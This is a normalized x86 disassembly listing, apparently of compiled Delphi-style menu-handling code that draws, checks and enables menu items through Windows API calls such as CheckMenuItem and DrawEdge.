mov eax [ eax - 0x8 ]
sub eax edx
inc eax
mov edx [ ebp + 0x8 ]
mov [ edx - 0x8 ] eax
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x38 ]
mov eax [ eax + 0x4c ]
mov edx [ eax ]
call [ edx + 0x2c ]
mov edx [ ebp + 0x8 ]
mov edx [ edx - 0x8 ]
sub edx eax
mov eax [ ebp + 0x8 ]
mov [ eax - 0x10 ] edx
adc edx 0x0
mov eax [ ebp + 0x8 ]
add edx esi
inc edx
push edx
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x4c ]
mov edx [ eax ]
call [ edx + 0x2c ]
mov edx [ ebp + 0x8 ]
mov edx [ edx - 0x8 ]
mov ecx [ ebp + 0x8 ]
mov ebx [ ecx - 0x10 ]
sub edx ebx
sub edx eax
sar edx 0x1
jns r-xdata
adc edx 0x0
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0xc ]
push eax
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x38 ]
mov eax [ eax + 0x40 ]
push eax
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x38 ]
mov al [ eax + 0x39 ]
push eax
mov eax [ ebp + 0x8 ]
mov ecx [ eax - 0x10 ]
mov eax [ ebp + 0x8 ]
mov edx [ eax - 0x28 ]
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x40 ]
call sub_4546b0
jmp r-xdata
push eax
push 0x0
mov eax [ ebp + 0x8 ]
add eax 0xffffffe0
push eax
call OffsetRect
mov eax [ ebp + 0x8 ]
cmp [ eax + 0x8 ] 0x0
je r-xdata
adc eax 0x0
mov eax [ ebp + 0x8 ]
cmp [ eax - 0x29 ] 0x0
jne r-xdata
push 0xf
push 0x4
mov eax [ ebp + 0x8 ]
add eax 0xffffffe0
push eax
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x28 ]
call sub_427d50
push eax
call DrawEdge
mov eax [ ebp + 0x8 ]
dec [ eax - 0x8 ]
mov eax [ ebp + 0x8 ]
dec [ eax - 0x4 ]
jmp r-xdata
mov eax [ ebp + 0x8 ]
add edx [ eax - 0xc ]
inc edx
mov eax [ ebp + 0x8 ]
mov [ eax - 0xc ] edx
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x38 ]
mov eax [ eax + 0x4c ]
mov edx [ eax ]
call [ edx + 0x20 ]
mov edx [ ebp + 0x8 ]
add eax [ edx - 0xc ]
mov edx [ ebp + 0x8 ]
mov [ edx - 0x4 ] eax
adc edx 0x0
mov eax [ ebp + 0x8 ]
add edx ebx
inc edx
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x28 ]
pop ecx
call sub_427900
mov eax [ ebp + 0x8 ]
mov edx [ eax - 0x48 ]
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x28 ]
mov eax [ eax + 0xc ]
call sub_426e3c
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push r-xdata
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x4c ]
call sub_403390
retn
adc edx 0x0
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x38 ]
cmp [ eax + 0x38 ] 0x0
je r-xdata
mov eax [ ebp + 0x8 ]
add eax 0xffffffe0
push eax
mov eax [ ebp + 0x8 ]
mov al [ eax - 0x29 ]
push eax
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x64 ]
push eax
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x38 ]
mov ecx [ eax + 0x30 ]
mov eax [ ebp + 0x8 ]
mov edx [ eax - 0x28 ]
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x38 ]
call sub_4573ac
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x38 ]
mov bx [ eax + 0x60 ]
test bx bx
je r-xdata
mov eax [ ebp + 0x8 ]
cmp [ eax - 0x29 ] 0x0
je r-xdata
push 0xffffffff
push 0x0
mov eax [ ebp + 0x8 ]
add eax 0xffffffe0
push eax
call OffsetRect
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_458813
lea eax [ ebp - 0x4 ]
call sub_404120
retn
mov eax [ ebp + 0x8 ]
cmp [ eax + 0x8 ] 0x0
jne r-xdata
mov eax [ ebp + 0x8 ]
cmp [ eax - 0x5d ] 0x0
je r-xdata
lea edx [ ebp - 0x4 ]
mov eax [ ebp + 0x8 ]
mov eax ebx
call sub_456470
mov eax [ ebp + 0x8 ]
mov [ eax - 0x20 ] 0xa
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x28 ]
mov edx [ ebp - 0x4 ]
call sub_427bb0
mov edx [ ebp + 0x8 ]
add eax [ edx - 0x20 ]
mov edx [ ebp + 0x8 ]
mov [ edx - 0x18 ] eax
mov eax [ ebp + 0x8 ]
add eax 0xffffffe0
push eax
mov eax [ ebp + 0x8 ]
mov al [ eax - 0x29 ]
push eax
push 0x2
mov eax [ ebp + 0x8 ]
mov edx [ eax - 0x28 ]
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x38 ]
mov ecx [ ebp - 0x4 ]
call sub_4573ac
push 0x0
push 0x1
mov eax [ ebp + 0x8 ]
add eax 0xffffffe0
push eax
call OffsetRect
sub_458960
push ebx
xor ebx ebx
mov edx [ eax + 0x64 ]
jmp r-xdata
test edx edx
je r-xdata
test edx edx
je r-xdata
cmp [ edx + 0x7c ] 0x0
je r-xdata
call sub_459344
test eax eax
je r-xdata
mov ebx [ edx + 0x7c ]
jmp r-xdata
mov edx [ edx + 0x64 ]
mov eax ebx
pop ebx
retn
mov ebx [ eax + 0x48 ]
sub_458990
push ebp
mov ebp esp
add esp 0xfffffeac
mov [ ebp - 0x154 ] 0x154
push 0x0
lea eax [ ebp - 0x154 ]
push eax
push 0x0
push 0x29
call SystemParametersInfoA
test eax eax
je r-xdata
mov esp ebp
pop ebp
retn
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x4 ]
mov edx [ ebp - 0xbc ]
mov [ eax ] edx
mov eax [ ebp + 0x8 ]
mov eax [ eax + 0x8 ]
mov edx [ ebp - 0xb8 ]
mov [ eax ] edx
sub_4589dc
push ebp
mov ebp esp
add esp 0xffffffdc
push ebx
push esi
push edi
xor ebx ebx
mov [ ebp - 0x24 ] ebx
mov [ ebp - 0x10 ] ebx
mov [ ebp - 0x4 ] ecx
mov [ ebp - 0x8 ] edx
mov edi eax
xor eax eax
push ebp
push sub_458bbe
push [ fs : eax ]
mov [ fs : eax ] esp
mov eax edi
mov si 0xfff2
call sub_40358c
mov edx [ r-xdata ]
call sub_40351c
test al al
je r-xdata
xor ebx ebx
mov bl 0x1
push ebp
call sub_458990
pop ecx
jmp r-xdata
cmp [ ebp - 0xc ] 0x0
je r-xdata
mov eax [ ebp + 0x8 ]
mov [ eax ] 0x5
mov eax [ ebp - 0x4 ]
mov [ eax ] 0xfffffffe
xor eax eax
jmp r-xdata
mov eax edi
call sub_459344
mov esi eax
mov eax edi
call sub_458960
mov [ ebp - 0xc ] eax
mov eax [ edi + 0x30 ]
mov edx r-xdata
call sub_40452c
jne r-xdata
cmp [ edi + 0x4c ] 0x0
je r-xdata
cmp [ edi + 0x40 ] 0xffffffff
jg r-xdata
test al al
je r-xdata
mov eax [ ebp - 0x4 ]
mov [ eax ] 0xfffffff9
xor eax eax
mov eax [ edi + 0x4c ]
mov edx [ eax ]
call [ edx + 0x1c ]
test al al
jne r-xdata
mov eax [ ebp - 0xc ]
mov eax [ eax + 0x34 ]
mov edx [ ebp - 0x4 ]
mov [ edx ] eax
test bl bl
jne r-xdata
test bl bl
jne r-xdata
test bl bl
jne r-xdata
test bl bl
jne r-xdata
mov eax [ ebp - 0x4 ]
mov [ eax ] 0x10
test bl bl
jne r-xdata
mov al 0x1
jmp r-xdata
mov eax [ ebp - 0xc ]
mov eax [ eax + 0x30 ]
mov edx [ ebp + 0x8 ]
mov [ edx ] eax
lea eax [ ebp - 0x20 ]
xor ecx ecx
mov edx 0x10
call sub_402da4
test esi esi
je r-xdata
mov eax [ ebp + 0x8 ]
add [ eax ] 0x3
mov eax [ ebp - 0x4 ]
add [ eax ] 0xf
mov al 0x1
jmp r-xdata
mov eax [ ebp + 0x8 ]
mov [ eax ] 0x10
mov eax esi
mov edx [ r-xdata ]
call sub_40351c
test al al
je r-xdata
xor ebx ebx
jmp r-xdata
xor ebx ebx
mov bl [ esi + 0x60 ]
jmp r-xdata
mov si [ edi + 0x60 ]
test si si
je r-xdata
lea eax [ ebp - 0x10 ]
mov edx [ edi + 0x30 ]
call sub_4041b8
lea edx [ ebp - 0x24 ]
mov eax esi
call sub_456470
mov ecx [ ebp - 0x24 ]
lea eax [ ebp - 0x10 ]
mov edx [ edi + 0x30 ]
call sub_40442c
jmp r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_458bc5
lea eax [ ebp - 0x24 ]
call sub_404120
lea eax [ ebp - 0x10 ]
call sub_404120
retn
mov eax [ ebp - 0x4 ]
push eax
mov eax [ ebp + 0x8 ]
push eax
mov ecx [ ebp - 0x8 ]
mov edx edi
mov eax [ edi + 0xa4 ]
call [ edi + 0xa0 ]
xor eax eax
mov al bl
mov ax [ eax * 2 + rw-data ]
or ax 0x40
or ax 0x20
or ax 0x100
or ax 0x400
movzx eax ax
lea edx [ ebp - 0x20 ]
push edx
push 0x0
push eax
mov ecx [ ebp - 0x10 ]
mov edx [ ebp - 0x8 ]
mov eax edi
call sub_4573ac
mov eax [ ebp - 0x18 ]
sub eax [ ebp - 0x20 ]
add eax 0x7
mov edx [ ebp - 0x4 ]
add [ edx ] eax
cmp [ edi + 0xa2 ] 0x0
je r-xdata
sub_458bf0
push ebx
push esi
mov esi edx
mov ebx eax
mov eax [ ebx + 0x30 ]
mov edx esi
call sub_40452c
je r-xdata
pop esi
pop ebx
retn
lea eax [ ebx + 0x30 ]
mov edx esi
call sub_404174
mov dl 0x1
mov eax ebx
mov ecx [ eax ]
call [ ecx + 0x3c ]
sub_458c18
push ebx
push esi
push edi
mov ebx eax
mov esi [ ebx + 0x64 ]
test esi esi
je r-xdata
pop edi
pop esi
pop ebx
retn
mov eax esi
call sub_458d88
dec eax
test eax eax
jl r-xdata
inc eax
mov esi eax
xor edi edi
inc edi
dec esi
jne r-xdata
cmp [ eax + 0x3d ] 0x0
je r-xdata
mov edx edi
mov eax [ ebx + 0x64 ]
call sub_458d98
cmp ebx eax
je r-xdata
mov dl [ eax + 0x3f ]
cmp dl [ ebx + 0x3f ]
jne r-xdata
xor edx edx
call sub_458c60
sub_458c60
push ebx
push esi
push edi
mov ebx edx
mov esi eax
cmp bl [ esi + 0x38 ]
je r-xdata
pop edi
pop esi
pop ebx
retn
mov [ esi + 0x38 ] bl
mov edi [ esi + 0x64 ]
test edi edi
je r-xdata
test bl bl
je r-xdata
test [ esi + 0x1c ] 0x2
jne r-xdata
cmp [ esi + 0x3d ] 0x0
je r-xdata
xor eax eax
mov al bl
mov eax [ eax * 4 + rw-data ]
or eax 0x0
push eax
movzx eax [ esi + 0x50 ]
push eax
mov eax edi
call sub_45731c
push eax
call CheckMenuItem
mov eax esi
call sub_458c18
sub_458cb4
push ebx
push esi
push edi
mov ebx edx
mov esi eax
cmp bl [ esi + 0x39 ]
je r-xdata
pop edi
pop esi
pop ebx
retn
mov [ esi + 0x39 ] bl
mov eax [ rw-data ]
cmp [ eax ] 0x2
jne r-xdata
mov edi [ esi + 0x64 ]
test edi edi
je r-xdata
mov eax esi
call sub_458d88
test eax eax
jne r-xdata
mov edi [ esi + 0x64 ]
test edi edi
je r-xdata
cmp [ edi + 0x6c ] 0x0
je r-xdata
mov dl 0x1
mov eax esi
mov ecx [ eax ]
call [ ecx + 0x3c ]
jmp r-xdata
xor edx edx
mov eax esi
mov ecx [ eax ]
call [ ecx + 0x3c ]
test [ esi + 0x1c ] 0x2
jne r-xdata
xor eax eax
mov al bl
mov eax [ eax * 4 + rw-data ]
or eax 0x0
push eax
movzx eax [ esi + 0x50 ]
push eax
mov eax edi
call sub_45731c
push eax
call EnableMenuItem
sub_458d2c
push ebx
push esi
push edi
mov ebx edx
mov esi eax
cmp bl [ esi + 0x3f ]
je r-xdata
pop edi
pop esi
pop ebx
retn
mov edi [ esi + 0x64 ]
test edi edi
je r-xdata
mov [ esi + 0x3f ] bl
cmp [ esi + 0x38 ] 0x0
je r-xdata
mov edx esi
mov eax edi
call sub_4590ec
mov edx eax
mov ecx ebx
mov eax edi
call sub_4572bc
cmp [ esi + 0x3d ] 0x0
je r-xdata
mov eax esi
call sub_458c18
sub_458d98
push ebx
push esi
mov esi edx
mov ebx eax
cmp [ ebx + 0x5c ] 0x0
jne r-xdata
mov edx esi
mov eax [ ebx + 0x5c ]
call sub_41b654
pop esi
pop ebx
retn
mov eax [ rw-data ]
call sub_4563c4
sub_458e08
push ebx
push esi
push edi
mov esi edx
mov ebx eax
mov eax [ ebx + 0x64 ]
test eax eax
je r-xdata
pop edi
pop esi
pop ebx
retn
call sub_458d88
test esi esi
jge r-xdata
cmp eax esi
jg r-xdata
xor esi esi
mov eax ebx
call sub_458df0
cmp esi eax
je r-xdata
mov esi eax
dec esi
mov edi [ ebx + 0x64 ]
mov edx ebx
mov eax edi
call sub_459120
mov ecx ebx
mov edx esi
mov eax edi
call sub_458f14
sub_458e50
push ebp
mov ebp esp
push ecx
push ebx
push esi
mov [ ebp - 0x4 ] eax
mov eax [ ebp - 0x4 ]
call sub_458d88
mov ebx eax
dec ebx
test ebx ebx
jl r-xdata
pop esi
pop ebx
pop ecx
pop ebp
retn 0x8
inc ebx
xor esi esi
mov edx esi
mov eax [ ebp - 0x4 ]
call sub_458d98
mov edx eax
mov eax [ ebp + 0xc ]
call [ ebp + 0x8 ]
inc esi
dec ebx
jne r-xdata
sub_458ea8
push ebx
push esi
push edi
push ebp
mov ebx edx
mov ebp eax
cmp bl [ ebp + 0x3a ]
je r-xdata
pop ebp
pop edi
pop esi
pop ebx
retn
test bl bl
je r-xdata
mov [ ebp + 0x3a ] bl
mov dl 0x1
mov eax ebp
mov ecx [ eax ]
call [ ecx + 0x3c ]
cmp [ ebp + 0x64 ] 0x0
je r-xdata
mov eax [ ebp + 0x64 ]
call sub_458d88
mov edi eax
dec edi
test edi edi
jl r-xdata
inc edi
xor esi esi
inc esi
dec edi
jne r-xdata
mov edx esi
mov eax [ ebp + 0x64 ]
call sub_458d98
mov [ eax + 0x3a ] 0x0
mov edx esi
mov eax [ ebp + 0x64 ]
call sub_458d98
cmp [ eax + 0x3a ] 0x0
je r-xdata
sub_458f14
push ebx
push esi
push edi
push ebp
mov esi ecx
mov edi edx
mov ebx eax
cmp [ esi + 0x64 ] 0x0
je r-xdata
cmp [ ebx + 0x5c ] 0x0
jne r-xdata
mov eax [ rw-data ]
call sub_4563c4
mov ebp edi
dec ebp
test ebp ebp
jl r-xdata
mov dl 0x1
mov eax [ r-xdata ]
call sub_403360
mov [ ebx + 0x5c ] eax
mov cl [ esi + 0x3f ]
mov edx edi
mov eax ebx
call sub_4572bc
mov ecx esi
mov edx edi
mov eax [ ebx + 0x5c ]
call sub_41b6d0
mov [ esi + 0x64 ] ebx
mov [ esi + 0x84 ] ebx
mov [ esi + 0x80 ] sub_45918c
cmp [ ebx + 0x34 ] 0x0
je r-xdata
mov eax [ ebx + 0x5c ]
cmp ebp [ eax + 0x8 ]
jge r-xdata
mov eax ebx
call sub_458d88
dec eax
sete dl
mov eax ebx
mov ecx [ eax ]
call [ ecx + 0x3c ]
pop ebp
pop edi
pop esi
pop ebx
retn
mov eax ebx
call sub_4571ec
mov edx ebp
mov eax [ ebx + 0x5c ]
call sub_41b654
mov al [ eax + 0x3f ]
cmp al [ esi + 0x3f ]
jbe r-xdata
mov edx ebp
mov eax [ ebx + 0x5c ]
call sub_41b654
mov dl [ eax + 0x3f ]
mov eax esi
call sub_458d2c
sub_458fc8
push ebx
push esi
push edi
mov esi edx
mov ebx eax
test esi esi
jl r-xdata
mov eax [ rw-data ]
call sub_4563c4
cmp [ ebx + 0x5c ] 0x0
je r-xdata
mov eax ebx
call sub_458d88
test eax eax
sete dl
mov eax ebx
mov ecx [ eax ]
call [ ecx + 0x3c ]
pop edi
pop esi
pop ebx
retn
mov eax ebx
call sub_4571ec
mov eax ebx
call sub_458d88
cmp esi eax
jl r-xdata
mov edx esi
mov eax [ ebx + 0x5c ]
call sub_41b654
mov edi eax
mov edx esi
mov eax [ ebx + 0x5c ]
call sub_41b544
xor eax eax
mov [ edi + 0x64 ] eax
xor eax eax
mov [ edi + 0x80 ] eax
mov [ edi + 0x84 ] eax
cmp [ ebx + 0x34 ] 0x0
je r-xdata
sub_45903c
push ebx
push esi
mov ebx eax
cmp [ ebx + 0x39 ] 0x0
je r-xdata
pop esi
pop ebx
retn
cmp [ ebx + 0x44 ] 0x0
jne r-xdata
mov esi [ ebx + 0x44 ]
test esi esi
je r-xdata
cmp [ ebx + 0xa8 ] 0x0
jne r-xdata
cmp [ ebx + 0x8a ] 0x0
je r-xdata
mov eax esi
mov edx [ eax ]
call [ edx + 0x78 ]
test al al
jne r-xdata
mov dl [ ebx + 0x38 ]
xor dl 0x1
mov eax ebx
call sub_458c60
test [ ebx + 0x1c ] 0x10
jne r-xdata
mov eax ebx
call sub_458d70
test eax eax
je r-xdata
cmp [ ebx + 0xa8 ] 0x0
je r-xdata
cmp [ ebx + 0x8a ] 0x0
je r-xdata
cmp [ ebx + 0x44 ] 0x0
je r-xdata
mov eax ebx
call sub_458d70
mov eax [ eax + 0x40 ]
cmp eax [ ebx + 0x88 ]
je r-xdata
mov edx ebx
mov eax [ ebx + 0x8c ]
call [ ebx + 0x88 ]
mov edx ebx
mov eax [ ebx + 0x44 ]
mov ecx [ eax ]
call [ ecx + 0x18 ]
jmp r-xdata
mov edx ebx
mov eax [ ebx + 0x8c ]
call [ ebx + 0x88 ]
jmp r-xdata
sub_459104
push ebx
push esi
mov esi edx
mov ebx eax
mov eax ebx
call sub_458d88
mov edx eax
mov ecx esi
mov eax ebx
call sub_458f14
pop esi
pop ebx
retn
sub_459120
push ebx
push esi
mov ebx eax
mov eax ebx
call sub_4590ec
mov esi eax
cmp esi 0xffffffff
jne r-xdata
mov edx esi
mov eax ebx
call sub_458fc8
pop esi
pop ebx
retn
mov eax [ rw-data ]
call sub_4563c4
sub_459148
push ebx
push esi
mov ebx edx
mov esi eax
cmp [ esi + 0x64 ] 0x0
jne r-xdata
mov eax esi
mov eax [ esi + 0x4 ]
mov edx [ r-xdata ]
call sub_40351c
test al al
je r-xdata
pop esi
pop ebx
retn
push ebx
mov ecx eax
mov edx esi
mov eax [ esi + 0x84 ]
call [ esi + 0x80 ]
xor eax eax
jmp r-xdata
cmp [ esi + 0x82 ] 0x0
je r-xdata
sub_45918c
push ebp
mov ebp esp
push ebx
push esi
mov esi ecx
mov ebx eax
cmp [ ebp + 0x8 ] 0x0
je r-xdata
mov eax [ ebx + 0x64 ]
test eax eax
je r-xdata
cmp [ ebx + 0x34 ] 0x0
jne r-xdata
mov esi [ ebx + 0x4 ]
mov eax esi
mov edx [ r-xdata ]
call sub_40351c
test al al
je r-xdata
push 0x0
mov ecx esi
mov edx ebx
call sub_45918c
jmp r-xdata
mov eax ebx
call sub_4571ec
cmp [ ebx + 0x6c ] 0x0
je r-xdata
pop esi
pop ebx
pop ebp
retn 0x4
mov eax esi
call sub_45ae64
sub_4591e4
push ebx
mov ebx eax
cmp [ ebx + 0x4c ] 0x0
jne r-xdata
mov dl 0x1
mov eax [ ebx + 0x4c ]
mov ecx [ eax ]
call [ ecx + 0x3c ]
mov eax [ ebx + 0x4c ]
pop ebx
retn
mov dl 0x1
mov eax [ r-xdata ]
call sub_42c074
mov [ ebx + 0x4c ] eax
sub_45920c
push ebx
push esi
push edi
mov edi edx
mov ebx eax
test edi edi
jne r-xdata
cmp [ ebx + 0x44 ] 0x0
jne r-xdata
mov eax [ ebx + 0x44 ]
call sub_403390
xor eax eax
mov [ ebx + 0x44 ] eax
jmp r-xdata
mov edx edi
mov eax [ ebx + 0x44 ]
mov ecx [ eax ]
call [ ecx + 0xc ]
mov eax [ ebx + 0x44 ]
mov [ eax + 0xc ] ebx
mov [ eax + 0x8 ] sub_4594a0
test [ edi + 0x1c ] 0x1
setne cl
mov edx edi
mov eax ebx
mov si 0xffef
call sub_40358c
mov edx ebx
mov eax edi
call sub_423b78
mov eax ebx
mov si 0xffee
call sub_40358c
mov ecx ebx
mov dl 0x1
call [ eax + 0x14 ]
mov [ ebx + 0x44 ] eax
pop edi
pop esi
pop ebx
retn
sub_45927c
push ebx
push esi
mov ebx edx
mov esi eax
cmp [ esi + 0x4c ] 0x0
jne r-xdata
mov edx ebx
mov eax [ esi + 0x4c ]
mov ecx [ eax ]
call [ ecx + 0x8 ]
mov dl 0x1
mov eax esi
mov ecx [ eax ]
call [ ecx + 0x3c ]
pop esi
pop ebx
retn
mov dl 0x1
mov eax [ r-xdata ]
call sub_42c074
mov [ esi + 0x4c ] eax
sub_4592b0
push ebx
push esi
push edi
mov edi eax
mov eax edi
call sub_458d88
mov ebx eax
dec ebx
test ebx ebx
jl r-xdata
pop edi
pop esi
pop ebx
retn
inc ebx
xor esi esi
mov edx esi
mov eax edi
call sub_458d98
mov edx [ eax ]
call [ edx + 0x40 ]
inc esi
dec ebx
jne r-xdata
sub_4592f0
push ebx
push esi
mov esi edx
mov ebx eax
mov eax [ ebx + 0x64 ]
test eax eax
je r-xdata
test esi esi
je r-xdata
mov edx ebx
call sub_459120
pop esi
pop ebx
retn
mov eax esi
mov edx [ r-xdata ]
call sub_40351c
test al al
je r-xdata
mov eax esi
mov edx [ r-xdata ]
call sub_40351c
test al al
je r-xdata
mov eax [ esi + 0x34 ]
mov edx ebx
call sub_459104
jmp r-xdata
mov edx ebx
mov eax esi
call sub_459104
sub_459354
push ebx
mov ebx eax
cmp dl [ ebx + 0x3d ]
je r-xdata
pop ebx
retn
mov [ ebx + 0x3d ] dl
cmp [ ebx + 0x38 ] 0x0
je r-xdata
mov dl 0x1
mov eax ebx
mov ecx [ eax ]
call [ ecx + 0x3c ]
cmp [ ebx + 0x3d ] 0x0
je r-xdata
mov eax ebx
call sub_458c18
sub_459380
push ebx
push esi
push edi
mov ebx ecx
mov edi edx
mov esi eax
mov eax edi
mov edx [ r-xdata ]
call sub_40351c
test al al
je r-xdata
pop edi
pop esi
pop ebx
retn
test bl bl
je r-xdata
mov al [ edi + 0x95 ]
mov [ esi + 0xa8 ] al
cmp [ esi + 0xa8 ] 0x0
jne r-xdata
mov edx [ edi + 0x64 ]
mov eax esi
call sub_458bf0
cmp [ esi + 0x30 ] 0x0
jne r-xdata
test bl bl
je r-xdata
mov dl [ edi + 0x69 ]
mov eax esi
call sub_458c60
cmp [ esi + 0x38 ] 0x0
jne r-xdata
test bl bl
je r-xdata
mov dl [ edi + 0x6a ]
mov eax esi
call sub_458cb4
cmp [ esi + 0x39 ] 0x1
jne r-xdata
test bl bl
je r-xdata
mov eax [ edi + 0x74 ]
mov [ esi + 0x54 ] eax
cmp [ esi + 0x54 ] 0x0
jne r-xdata
test bl bl
je r-xdata
lea eax [ esi + 0x58 ]
mov edx [ edi + 0x7c ]
call sub_404174
cmp [ esi + 0x58 ] 0x0
jne r-xdata
test bl bl
je r-xdata
test bl bl
je r-xdata
test bl bl
je r-xdata
cmp [ esi + 0x3d ] 0x0
je r-xdata
mov edx [ edi + 0x80 ]
mov eax esi
call sub_458de0
cmp [ esi + 0x40 ] 0xffffffff
jne r-xdata
mov dl [ edi + 0x6c ]
mov eax esi
call sub_458d2c
cmp [ esi + 0x3f ] 0x0
jne r-xdata
mov dx [ edi + 0x84 ]
mov eax esi
call sub_458dbc
cmp [ esi + 0x60 ] 0x0
jne r-xdata
test bl bl
je r-xdata
mov dl [ edi + 0x86 ]
mov eax esi
call sub_458dd0
cmp [ esi + 0x3e ] 0x1
jne r-xdata
test bl bl
je r-xdata
mov eax [ edi + 0x40 ]
mov [ esi + 0x88 ] eax
mov eax [ edi + 0x44 ]
mov [ esi + 0x8c ] eax
cmp [ esi + 0x8a ] 0x0
jne r-xdata
test bl bl
je r-xdata
sub_4594a0
push esi
push edi
mov edi edx
mov esi eax
mov eax esi
call sub_458d70
cmp edi eax
jne r-xdata
pop edi
pop esi
retn
xor ecx ecx
mov edx edi
mov eax esi
mov si 0xffef
call sub_40358c
sub_4594c4
push ebx
push esi
mov ebx eax
mov esi [ ebx + 0x44 ]
test esi esi
je r-xdata
mov al 0x1
pop esi
pop ebx
retn
mov eax esi
mov edx [ eax ]
call [ edx + 0x20 ]
test al al
je r-xdata
xor eax eax
pop esi
pop ebx
retn
sub_4594e4
push ebx
push esi
mov ebx eax
mov esi [ ebx + 0x44 ]
test esi esi
je r-xdata
mov al 0x1
pop esi
pop ebx
retn
mov eax esi
mov edx [ eax ]
call [ edx + 0x24 ]
test al al
je r-xdata
xor eax eax
pop esi
pop ebx
retn
sub_459504
push ebx
push esi
mov ebx eax
mov esi [ ebx + 0x44 ]
test esi esi
je r-xdata
mov al 0x1
pop esi
pop ebx
retn
mov eax esi
mov edx [ eax ]
call [ edx + 0x28 ]
test al al
je r-xdata
xor eax eax
pop esi
pop ebx
retn
sub_459524
push ebx
push esi
mov ebx eax
mov esi [ ebx + 0x44 ]
test esi esi
je r-xdata
mov al 0x1
pop esi
pop ebx
retn
mov eax esi
mov edx [ eax ]
call [ edx + 0x38 ]
test al al
je r-xdata
xor eax eax
pop esi
pop ebx
retn
sub_459544
push ebx
push esi
mov ebx eax
mov esi [ ebx + 0x44 ]
test esi esi
je r-xdata
mov al 0x1
pop esi
pop ebx
retn
mov eax esi
mov edx [ eax ]
call [ edx + 0x30 ]
test al al
je r-xdata
xor eax eax
pop esi
pop ebx
retn
sub_459564
push ebx
push esi
mov ebx eax
mov esi [ ebx + 0x44 ]
test esi esi
je r-xdata
mov al 0x1
pop esi
pop ebx
retn
mov eax esi
mov edx [ eax ]
call [ edx + 0x3c ]
test al al
je r-xdata
xor eax eax
pop esi
pop ebx
retn
sub_459584
push ebx
push esi
mov ebx eax
mov esi [ ebx + 0x44 ]
test esi esi
je r-xdata
mov al 0x1
pop esi
pop ebx
retn
mov eax esi
mov edx [ eax ]
call [ edx + 0x40 ]
test al al
je r-xdata
xor eax eax
pop esi
pop ebx
retn
sub_4595a4
push ebx
push esi
mov ebx eax
mov esi [ ebx + 0x44 ]
test esi esi
je r-xdata
mov al 0x1
pop esi
pop ebx
retn
mov eax esi
mov edx [ eax ]
call [ edx + 0x44 ]
test al al
je r-xdata
xor eax eax
pop esi
pop ebx
retn
sub_4595c4
push ebx
push esi
mov ebx eax
mov esi [ ebx + 0x44 ]
test esi esi
je r-xdata
mov al 0x1
pop esi
pop ebx
retn
mov eax esi
mov edx [ eax ]
call [ edx + 0x8 ]
test al al
je r-xdata
xor eax eax
pop esi
pop ebx
retn
sub_4595e4
push ebx
push esi
push edi
mov esi edx
mov ebx eax
mov eax esi
mov edx [ r-xdata ]
call sub_40351c
test al al
je r-xdata
mov edx esi
mov eax ebx
call sub_41bd34
mov dl [ ebx + 0x39 ]
mov edi esi
mov eax edi
call sub_4538ec
mov edx [ ebx + 0x54 ]
mov eax edi
mov ecx [ eax ]
call [ ecx + 0x48 ]
mov edx [ ebx + 0x58 ]
mov eax edi
call sub_453a24
mov edx [ ebx + 0x40 ]
mov eax edi
call sub_453a84
mov edx [ ebx + 0x30 ]
mov eax edi
call sub_453784
mov dl [ ebx + 0x3e ]
mov eax edi
call sub_453b44
push [ ebx + 0x8c ]
push [ ebx + 0x88 ]
mov eax edi
mov edx [ eax ]
call [ edx + 0x34 ]
jmp r-xdata
pop edi
pop esi
pop ebx
retn
sub_45965c
push ebx
push esi
push edi
mov ebx ecx
mov edi edx
mov esi eax
mov ecx ebx
mov edx edi
mov eax esi
call sub_423dc4
cmp bl 0x1
jne r-xdata
pop edi
pop esi
pop ebx
retn
mov eax esi
call sub_458d70
cmp edi eax
jne r-xdata
cmp edi [ esi + 0x7c ]
jne r-xdata
xor edx edx
mov eax esi
call sub_45920c
jmp r-xdata
cmp edi [ esi + 0x68 ]
jne r-xdata
xor edx edx
mov eax esi
call sub_4596b0
jmp r-xdata
xor edx edx
mov eax esi
call sub_457174
sub_4596b0
push ebx
push esi
mov esi edx
mov ebx eax
mov eax [ ebx + 0x7c ]
test eax eax
je r-xdata
mov eax esi
mov [ ebx + 0x7c ] eax
test eax eax
je r-xdata
mov edx [ ebx + 0x78 ]
call sub_454b48
mov eax ebx
call sub_459720
pop esi
pop ebx
retn
mov edx [ ebx + 0x78 ]
call sub_454b8c
mov edx ebx
mov eax [ ebx + 0x7c ]
call sub_423b78
sub_4596f8
push ebx
push esi
mov esi eax
xor ebx ebx
mov eax sub_4596f8
mov ecx esi
mov edx [ esi + 0x68 ]
call sub_456848
push 0x1
mov ecx esi
mov edx esi
mov eax esi
call sub_45918c
mov eax ebx
pop esi
pop ebx
retn
sub_459734
push ebp
mov ebp esp
push ebx
mov edx [ ebp + 0x8 ]
mov edx [ edx - 0x4 ]
call sub_40c964
test eax eax
setne bl
test bl bl
je r-xdata
mov eax ebx
pop ebx
pop ebp
retn
mov edx [ ebp + 0x8 ]
add edx 0xfffffffc
mov ecx 0x1
xchg edx eax
call sub_404680
sub_459764
push ebp
mov ebp esp
push ebx
push esi
push edi
mov eax [ ebp + 0x8 ]
mov edx [ eax - 0xc ]
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x8 ]
mov ecx [ eax ]
call [ ecx + 0x8 ]
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0xc ]
mov edx [ eax ]
call [ edx + 0x14 ]
mov edx [ ebp + 0x8 ]
